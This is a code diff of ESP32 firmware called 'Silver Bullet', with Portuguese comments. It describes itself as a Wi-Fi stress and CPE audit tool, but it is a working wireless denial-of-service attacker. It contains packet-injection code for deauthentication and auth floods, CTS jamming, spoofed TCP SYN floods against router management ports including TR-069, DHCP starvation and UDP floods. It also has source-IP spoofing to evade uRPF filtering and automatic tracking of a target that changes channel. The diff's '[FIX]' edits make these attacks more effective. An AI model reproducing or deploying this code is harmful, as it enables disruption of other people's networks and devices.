@@ -2,14 +2,14 @@
  * @file silver_bullet.cpp
  * @brief Silver Bullet - Ferramenta Avançada de Estresse Wi-Fi e Auditoria de CPEs
  * @hardware ESP32-S3 (M5Stack Cardputer) / ESP32 WROOM
- * * @details
+ * @details
  * Firmware de injeção bare-metal focado em equipamentos de telecomunicações.
  * Funcionalidades ativas:
  * - CTS Jamming (Evasão WPA3)
  * - TCP SYN Flood Direcionado (TR-069, SSH, HTTP)
- * - DHCP Starvation (Esgotamento de Pool IP)
+ * - DHCP Starvation (Esgotamento de Pool IP com Magic Cookie)
  * - uRPF Bypass (Spoofing Dinâmico de Sub-redes)
- * - Channel Pursuit (Perseguição automática de alvo em caso de Auto-Channel)
+ * - Channel Pursuit (Perseguição automática)
  * - Checksum Incremental RFC 1624 (Otimização Extrema de PPS)
  */
 
@@ -28,9 +28,6 @@
 // ===================================================================
 // 1. ESTRUTURAS DE PACOTES (OTIMIZADAS PARA ACESSO DIRETO DMA)
 // ===================================================================
-// O uso de __attribute__((packed)) impede que o compilador adicione 
-// bytes de preenchimento (padding). Isso é obrigatório para que o 
-// buffer da memória seja enviado perfeitamente para o rádio Wi-Fi.
 
 struct __attribute__((packed)) DeauthPacket {
     uint16_t frame_control; uint16_t duration;
@@ -74,13 +71,12 @@ struct __attribute__((packed)) TcpHeader {
     uint16_t checksum; uint16_t urgent_ptr;
 };
 
-// Estrutura Híbrida L3/L4: Permite forjar TCP ou UDP no mesmo loop sem realocar memória
 struct __attribute__((packed)) SilverBulletPacket {
     MacHeader mac;
     LlcSnapHeader llc;
     IpHeader ip;
     union { UdpHeader udp; TcpHeader tcp; } l4;
-    uint8_t payload[256]; // Payload aumentado para acomodar pacotes DHCP Discover
+    uint8_t payload[256]; 
 };
 
 struct __attribute__((packed)) PseudoHeader {
@@ -96,14 +92,13 @@ wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
 uint16_t total_alvos = 0;
 int alvo_selecionado = 0;
 
-// Variáveis Atômicas: Evitam condições de corrida (Race Conditions) entre o Core 0 e Core 1
 std::atomic<uint8_t> canal_atual_alvo{0};
 std::atomic<int8_t> rssi_alvo{0};
 std::atomic<bool> alvo_perdido{false};
 std::atomic<bool> tx_power_max{true}; 
 std::atomic<bool> flag_update_config{false}; 
 std::atomic<bool> erro_memoria_critico{false}; 
-std::atomic<bool> scanner_pausa_ataque{false}; // Usado para pausar o tx durante o Channel Pursuit
+std::atomic<bool> scanner_pausa_ataque{false}; 
 
 std::atomic<uint32_t> pacotes_enviados_segundo{0};
 std::atomic<uint32_t> pps_atual{0};
@@ -136,8 +131,6 @@ const char* get_nome_modo() {
 // ===================================================================
 // 3. MOTORES MATEMÁTICOS DE ALTA PERFORMANCE (RAM/IRAM)
 // ===================================================================
-// A tag IRAM_ATTR força essas funções a rodarem na RAM interna do chip,
-// ignorando a Flash externa. Isso dobra a velocidade de cálculo.
 
 IRAM_ATTR inline uint32_t fast_rand() {
     uint32_t x = prng_state;
@@ -145,11 +138,6 @@ IRAM_ATTR inline uint32_t fast_rand() {
     return prng_state = x;
 }
 
-/**
- * @brief Checksum Diferencial IP (RFC 1624)
- * Calcula o Header Checksum exigido pela pilha TCP/IP do roteador alvo.
- * Sem isso, os pacotes L3 são dropados na placa de rede silenciosamente.
- */
 IRAM_ATTR inline uint16_t fast_ip_checksum(IpHeader *ip) {
     uint32_t acc = 0;
     uint16_t *data = (uint16_t *)ip;
@@ -158,11 +146,6 @@ IRAM_ATTR inline uint16_t fast_ip_checksum(IpHeader *ip) {
     return ~acc;
 }
 
-/**
- * @brief Checksum de Camada 4 com Pseudo-Header
- * Integra os IPs de origem e destino na matemática do UDP/TCP para 
- * bypass de validações rígidas de firewall (como iptables/netfilter).
- */
 IRAM_ATTR inline uint16_t fast_l4_checksum(IpHeader *ip, void *l4_hdr, size_t l4_len, uint8_t *payload, size_t payload_len) {
     PseudoHeader psd;
     memcpy(psd.src_ip, ip->ip_src, 4); memcpy(psd.dest_ip, ip->ip_dest, 4);
@@ -186,38 +169,30 @@ IRAM_ATTR inline uint16_t fast_l4_checksum(IpHeader *ip, void *l4_hdr, size_t l4
 // ===================================================================
 // 4. MÓDULO DE RECONHECIMENTO AUTOMÁTICO
 // ===================================================================
+
 void analisar_alvo_automaticamente(int indice_alvo) {
     wifi_ap_record_t ap = alvos_encontrados[indice_alvo];
     
-    // 1. Condição Física: Se o sinal for menor que -75dBm, pacotes complexos (L3/L4) 
-    // vão corromper no ar. A melhor escolha é focar apenas em Jamming Físico.
     if (ap.rssi < -75) {
         estrategia_atual.store(ESTRATEGIA_SINAL_FRACO);
         return;
     }
 
-    // 2. Análise de Criptografia e PMF (Protected Management Frames)
     if (ap.authmode == WIFI_AUTH_WPA3_PSK || 
         ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK || 
         ap.authmode == WIFI_AUTH_ENTERPRISE) {
-        // WPA3 exige PMF. Pacotes Deauth (L2) serão sumariamente ignorados pelo roteador.
-        // A melhor escolha: Não desperdiçar CPU com Deauth. Usar CTS + TCP SYN Flood.
         estrategia_atual.store(ESTRATEGIA_WPA3_BLINDADO);
     }
     else if (ap.authmode == WIFI_AUTH_OPEN || ap.authmode == WIFI_AUTH_WEP) {
-        // Sem criptografia ou WEP fraco. A rede está nua.
-        // A melhor escolha: Destruição total com Deauth + DHCP Starvation agressivo.
         estrategia_atual.store(ESTRATEGIA_LEGACY_CRITICA);
     }
     else {
-        // WPA2 Padrão (Sem PMF obrigatório). 
-        // A melhor escolha: O Combo Fatal (Deauth para derrubar + CTS para silenciar + L3/L4 para travar a CPU).
         estrategia_atual.store(ESTRATEGIA_WPA2_VULN);
     }
 }
 
 // ===================================================================
-// 5. INTERFACE, MONITORAMENTO E INTELIGÊNCIA SECUNDÁRIA (CORE 1)
+// 5. INTERFACE E MONITORAMENTO TÉRMICO (CORE 1)
 // ===================================================================
 
 void escanear_redes() {
@@ -269,10 +244,17 @@ void task_display(void *pvParameters) {
                 M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                 M5.Display.printf("⚔️ ALVO: %s\n", alvos_encontrados[alvo_selecionado].ssid);
                 
-                // THERMAL THROTTLING: Reduz potência do rádio se passar de 75ºC para proteger o silício
                 float tsens_out = 0.0;
                 if (temp_sensor != NULL) temperature_sensor_get_celsius(temp_sensor, &tsens_out);
-                if (tsens_out > 75.0 && tx_power_max.load()) { tx_power_max.store(false); flag_update_config.store(true); }
+                
+                // [FIX] Recuperação Térmica Automática: Agora ele reativa o rádio máximo assim que a pastilha esfriar
+                if (tsens_out > 75.0 && tx_power_max.load()) { 
+                    tx_power_max.store(false); 
+                    flag_update_config.store(true); 
+                } else if (tsens_out < 65.0 && !tx_power_max.load()) {
+                    tx_power_max.store(true); 
+                    flag_update_config.store(true);
+                }
                 
                 M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                 M5.Display.printf("CH: %d | TEMP: %.1fC | %s\n", canal_atual_alvo.load(), tsens_out, tx_power_max.load() ? "MAX" : "ECO");
@@ -295,12 +277,6 @@ void task_display(void *pvParameters) {
     }
 }
 
-/**
- * @brief Rastreio de Fuga de Canal (Channel Pursuit)
- * Se o roteador alvo detectar estresse intenso, sua função 'Auto-Channel' pode 
- * saltar de frequência. Esta tarefa detecta a queda repentina de envio, pausa 
- * o ataque, escaneia o BSSID nos 13 canais, realinha o rádio e retoma o tiro.
- */
 void task_monitoramento(void *pvParameters) {
     uint8_t falhas_consecutivas = 0;
     while (true) {
@@ -309,8 +285,8 @@ void task_monitoramento(void *pvParameters) {
             else falhas_consecutivas = 0;
 
             if (falhas_consecutivas > 3 && !alvo_perdido.load()) {
-                scanner_pausa_ataque.store(true); // Grita para o Motor de Injeção pausar
-                vTaskDelay(pdMS_TO_TICKS(100));   // Aguarda o DMA esvaziar
+                scanner_pausa_ataque.store(true); 
+                vTaskDelay(pdMS_TO_TICKS(100));   
                 
                 uint8_t mac_alvo[6];
                 memcpy(mac_alvo, alvos_encontrados[alvo_selecionado].bssid, 6);
@@ -323,14 +299,14 @@ void task_monitoramento(void *pvParameters) {
                     esp_wifi_scan_get_ap_records(&num_aps, &ap_encontrado);
                     
                     if (num_aps > 0) {
-                        canal_atual_alvo.store(ap_encontrado.primary); // Alvo achado, realinha a mira
+                        canal_atual_alvo.store(ap_encontrado.primary); 
                         flag_update_config.store(true);
                         falhas_consecutivas = 0;
                     } else {
-                        alvo_perdido.store(true); // Realmente desligaram o equipamento
+                        alvo_perdido.store(true); 
                     }
                 }
-                scanner_pausa_ataque.store(false); // Retoma o fogo
+                scanner_pausa_ataque.store(false); 
             }
             vTaskDelay(pdMS_TO_TICKS(2000));
         } else {
@@ -344,7 +320,6 @@ void task_monitoramento(void *pvParameters) {
 // ===================================================================
 
 void task_ataque(void *pvParameters) {
-    // MALLOC_CAP_DMA: Aloca as estruturas em memória contígua capaz de acesso direto pelo Rádio Wi-Fi.
     SilverBulletPacket* pkt = (SilverBulletPacket*) heap_caps_malloc(sizeof(SilverBulletPacket), MALLOC_CAP_DMA);
     DeauthPacket* deauth = (DeauthPacket*) heap_caps_malloc(sizeof(DeauthPacket), MALLOC_CAP_DMA);
     AuthPacket* auth = (AuthPacket*) heap_caps_malloc(sizeof(AuthPacket), MALLOC_CAP_DMA);
@@ -359,10 +334,8 @@ void task_ataque(void *pvParameters) {
     pkt->llc.oui[0] = 0x00; pkt->llc.oui[1] = 0x00; pkt->llc.oui[2] = 0x00;
     pkt->llc.ethertype = htons(0x0800); 
     
-    // BYPASS uRPF: Rotaciona por faixas de IP conhecidas e CGNAT para não ser barrado em roteadores de borda
     const uint8_t subnets[][2] = {{192, 168}, {10, 0}, {172, 16}, {100, 64}}; 
-    // PORTAS FERIDA: Serviços de gerência sensíveis a travamento de CPU em CPEs
-    const uint16_t portas_gerencia[] = {80, 443, 22, 7547}; // 7547 = TR-069 (Extremamente Letal)
+    const uint16_t portas_gerencia[] = {80, 443, 22, 7547}; 
 
     bool config_radio_aplicada = false;
 
@@ -370,7 +343,9 @@ void task_ataque(void *pvParameters) {
         if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load() && !scanner_pausa_ataque.load()) {
             
             if (!config_radio_aplicada || flag_update_config.load()) {
-                esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 20); // 80 units = 20 dBm Máximo Físico
+                // [FIX] Tx Power: A API esp_wifi_set_max_tx_power() usa incrementos de 0.25 dBm. 
+                // 80 * 0.25 = 20 dBm (Max). 40 * 0.25 = 10 dBm (Modo ECO real).
+                esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 40); 
                 esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
                 config_radio_aplicada = true; flag_update_config.store(false);
             }
@@ -388,8 +363,12 @@ void task_ataque(void *pvParameters) {
 
             cts->frame_control = 0x00C4; cts->duration = 32767; memcpy(cts->mac_ra, mac_alvo, 6);
 
-            pkt->mac.frame_control = 0x0008; pkt->mac.duration = 0;
-            memcpy(pkt->mac.mac_dest, mac_alvo, 6); memcpy(pkt->mac.mac_bssid, mac_alvo, 6); 
+            // [FIX] Frame Control: O valor 0x0108 ativa a flag 'To DS=1'.
+            // Isso obriga o Roteador/AP a processar e encaminhar o frame forjado para sua CPU interna.
+            pkt->mac.frame_control = 0x0108; 
+            pkt->mac.duration = 0;
+            memcpy(pkt->mac.mac_dest, mac_alvo, 6); 
+            memcpy(pkt->mac.mac_bssid, mac_alvo, 6); 
             pkt->ip.version_ihl = 0x45; pkt->ip.ttl = 64; 
 
             bool atirar_l2 = false;
@@ -400,28 +379,27 @@ void task_ataque(void *pvParameters) {
             else if (modo == MODO_MANUAL_CTS) atirar_cts = true;
             else if (modo == MODO_MANUAL_L3) atirar_l3 = true;
             else if (modo == MODO_AUTOMATICO) {
-                // A Máquina de Estado Inteligente aplica as melhores combinações
                 switch (estrategia) {
                     case ESTRATEGIA_SINAL_FRACO:
-                        atirar_cts = true; // Reserva o canal e cala o AP de longe
+                        atirar_cts = true; 
                         break;
                     case ESTRATEGIA_WPA3_BLINDADO:
-                        atirar_cts = true; // CTS passa pelo WPA3
-                        atirar_l3 = true;  // Força o Kernel a rotear lixo
+                        atirar_cts = true; 
+                        atirar_l3 = true;  
                         break;
                     case ESTRATEGIA_WPA2_VULN:
-                        atirar_l2 = true;  // Derruba os clientes
-                        atirar_cts = true; // Impede a reconexão
-                        atirar_l3 = true;  // Trava o Conntrack
+                        atirar_l2 = true;  
+                        atirar_cts = true; 
+                        atirar_l3 = true;  
                         break;
                     case ESTRATEGIA_LEGACY_CRITICA:
-                        atirar_l2 = true;  // Auth Flood enche a tabela CAM
-                        atirar_l3 = true;  // DHCP esgota os IPs muito rápido em redes abertas
+                        atirar_l2 = true;  
+                        atirar_l3 = true;  
                         break;
                     default: break;
                 }
             }
-            // ================== ATAQUES L2 / JAMMING ==================
+            
             if (atirar_l2) {
                 for(int j = 0; j < 5; j++) { 
                     auth->mac_src[3] = fast_rand() & 0xFF; auth->mac_src[4] = fast_rand() & 0xFF; auth->mac_src[5] = fast_rand() & 0xFF;
@@ -435,20 +413,16 @@ void task_ataque(void *pvParameters) {
                 if (esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_OK) pacotes_enviados_segundo++;
             }
 
-            // ================== ATAQUES L3/L4 (SNIPER INTELIGENTE) ==================
             if (atirar_l3) {
-                // Inteligência: Ajuste de probabilidade baseado no tipo de alvo
-                int chance_tcp_syn = 6;  // Padrão: 60%
-                int chance_dhcp    = 2;  // Padrão: 20%
+                int chance_tcp_syn = 6;  
+                int chance_dhcp    = 2;  
                 
                 if (estrategia == ESTRATEGIA_LEGACY_CRITICA) {
-                    // Redes abertas aceitam broadcast DHCP perfeitamente. Máxima prioridade.
-                    chance_tcp_syn = 3; // 30%
-                    chance_dhcp    = 6; // 60% DHCP Starvation
+                    chance_tcp_syn = 3; 
+                    chance_dhcp    = 6; 
                 } else if (estrategia == ESTRATEGIA_WPA3_BLINDADO) {
-                    // Maior foco em esgotamento de CPU/Conntrack em portas de gerência (TR-069, SSH)
-                    chance_tcp_syn = 8; // 80% TCP SYN
-                    chance_dhcp    = 1; // 10% DHCP
+                    chance_tcp_syn = 8; 
+                    chance_dhcp    = 1; 
                 }
 
                 for (int i = 0; i < 15; i++) { 
@@ -470,37 +444,48 @@ void task_ataque(void *pvParameters) {
                     
                     if (is_tcp) {
                         pkt->ip.protocol = 6; 
-                        pkt->ip.ip_dest[0] = 192; pkt->ip.ip_dest[1] = 168; pkt->ip.ip_dest[2] = 1; pkt->ip.ip_dest[3] = 1; // Força no IP de Gateway Padrão
+                        pkt->ip.ip_dest[0] = 192; pkt->ip.ip_dest[1] = 168; pkt->ip.ip_dest[2] = 1; pkt->ip.ip_dest[3] = 1; 
                         
                         pkt->l4.tcp.src_port = htons(1024 + (fast_rand() % 60000)); 
-                        pkt->l4.tcp.dest_port = htons(portas_gerencia[fast_rand() % 4]); // Tiro certeiro: TR-069, SSH, WEB
+                        pkt->l4.tcp.dest_port = htons(portas_gerencia[fast_rand() % 4]); 
                         pkt->l4.tcp.seq_num = fast_rand(); pkt->l4.tcp.ack_num = 0;
-                        pkt->l4.tcp.data_offset_res = (5 << 4); pkt->l4.tcp.flags = 0x02; // SYN Flag Mágica
+                        pkt->l4.tcp.data_offset_res = (5 << 4); pkt->l4.tcp.flags = 0x02; 
                         pkt->l4.tcp.window_size = htons(5840); pkt->l4.tcp.urgent_ptr = 0;
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(TcpHeader) + t_payload;
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(TcpHeader) + t_payload);
+                        
+                        // [FIX] Mac Destination deve retornar ao MAC do Alvo no TCP/UDP padrão
+                        memcpy(pkt->mac.mac_dest, mac_alvo, 6);
                         
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                         pkt->l4.tcp.checksum = 0; pkt->l4.tcp.checksum = fast_l4_checksum(&pkt->ip, &pkt->l4.tcp, sizeof(TcpHeader), pkt->payload, t_payload);
                     } 
                     else if (is_dhcp) {
                         pkt->ip.protocol = 17; 
-                        pkt->ip.ip_dest[0] = 255; pkt->ip.ip_dest[1] = 255; pkt->ip.ip_dest[2] = 255; pkt->ip.ip_dest[3] = 255; // Broadcast Total
+                        pkt->ip.ip_dest[0] = 255; pkt->ip.ip_dest[1] = 255; pkt->ip.ip_dest[2] = 255; pkt->ip.ip_dest[3] = 255; 
                         
-                        pkt->l4.udp.src_port = htons(68); pkt->l4.udp.dest_port = htons(67); // Portas do Serviço DHCP
+                        pkt->l4.udp.src_port = htons(68); pkt->l4.udp.dest_port = htons(67); 
                         
-                        // MAGIC BYTES: Falsifica uma requisição real de obtenção de IP
                         pkt->payload[0] = 0x01; pkt->payload[1] = 0x01; pkt->payload[2] = 0x06; pkt->payload[3] = 0x00; 
+                        
+                        // [FIX] Magic Cookie obrigatório para que o dnsmasq não descarte o pacote no roteador.
+                        pkt->payload[236] = 0x63; 
+                        pkt->payload[237] = 0x82; 
+                        pkt->payload[238] = 0x53; 
+                        pkt->payload[239] = 0x63;
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + 240; 
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + 240);
                         pkt->l4.udp.length = htons(sizeof(UdpHeader) + 240);
                         
+                        // [FIX] Broadcast MAC de Camada 2 no campo "Address 3"
+                        memcpy(pkt->mac.mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+                        
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                         pkt->l4.udp.checksum = 0; pkt->l4.udp.checksum = fast_l4_checksum(&pkt->ip, &pkt->l4.udp, sizeof(UdpHeader), pkt->payload, 240);
                     }
-                    else { // 20% UDP Flood Padrão para lotar tabelas simples
+                    else { 
                         pkt->ip.protocol = 17; 
                         pkt->ip.ip_dest[0] = 8; pkt->ip.ip_dest[1] = 8; pkt->ip.ip_dest[2] = 8; pkt->ip.ip_dest[3] = 8; 
                         pkt->l4.udp.src_port = htons(1024 + (fast_rand() % 60000)); pkt->l4.udp.dest_port = htons(53); 
@@ -509,12 +494,13 @@ void task_ataque(void *pvParameters) {
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + t_payload);
                         pkt->l4.udp.length = htons(sizeof(UdpHeader) + t_payload);
                         
+                        // [FIX] Mac Destination deve retornar ao MAC do Alvo no TCP/UDP padrão
+                        memcpy(pkt->mac.mac_dest, mac_alvo, 6);
+                        
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                         pkt->l4.udp.checksum = 0; pkt->l4.udp.checksum = fast_l4_checksum(&pkt->ip, &pkt->l4.udp, sizeof(UdpHeader), pkt->payload, t_payload);
                     }
                     
-                    // MICRO-DELAY OTIMIZADO: Em vez de usar taskYIELD (que causa loop infinito no mesmo nível de prioridade),
-                    // damos 1 milissegundo real de respiro para o Rádio PHY liberar o Buffer DMA para a próxima rajada.
                     if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_ERR_NO_MEM) { 
                         vTaskDelay(pdMS_TO_TICKS(1)); 
                         break; 
@@ -526,7 +512,7 @@ void task_ataque(void *pvParameters) {
             taskYIELD(); 
         } else {
             config_radio_aplicada = false; 
-            vTaskDelay(pdMS_TO_TICKS(100)); // Aguarda UI ou fim do Scan do Channel Pursuit
+            vTaskDelay(pdMS_TO_TICKS(100)); 
         }
     }
 }
@@ -543,12 +529,11 @@ extern "C" void app_main(void) {
     wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_wifi_init(&wifi_cfg); 
     esp_wifi_set_storage(WIFI_STORAGE_RAM); esp_wifi_set_mode(WIFI_MODE_STA);
-    esp_wifi_start(); esp_wifi_set_ps(WIFI_PS_NONE); // Desliga Power Saving para máximo throughput
+    esp_wifi_start(); esp_wifi_set_ps(WIFI_PS_NONE); 
 
     temperature_sensor_config_t ts_cfg = TEMPERATURE_SENSOR_CONFIG_DEFAULT(20, 100);
     if (temperature_sensor_install(&ts_cfg, &temp_sensor) == ESP_OK) temperature_sensor_enable(temp_sensor);
 
-    // FIXAR NO NÚCLEO ZERO: O ataque pesado isola o Core 0 da CPU para evitar Kernel Panic
     xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0); 
     xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
     xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 
